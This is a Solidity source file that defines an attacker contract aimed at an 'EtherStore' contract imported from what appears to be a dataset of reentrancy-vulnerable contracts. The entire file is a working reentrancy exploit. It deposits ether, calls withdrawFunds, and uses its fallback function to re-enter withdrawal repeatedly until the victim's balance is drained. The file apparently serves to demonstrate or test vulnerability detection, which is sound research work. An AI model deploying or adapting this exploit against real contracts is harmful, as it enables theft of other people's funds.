pragma solidity ^0.4.10;

import "../dataset/reentrancy/etherstore.sol";

contract MaliciousContract {
    EtherStore etherstore;

    constructor(address _victimAddress) public {
        etherstore = EtherStore(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(
            amount >= 1 ether,
            "Must attempt and attack with at least 1 ether"
        );
        etherstore.withdrawFunds(amount);
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        etherstore.depositFunds.value(msg.value)();
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(etherstore).balance >= 1 ether) {
            etherstore.withdrawFunds(1 ether);
        }
    }
}
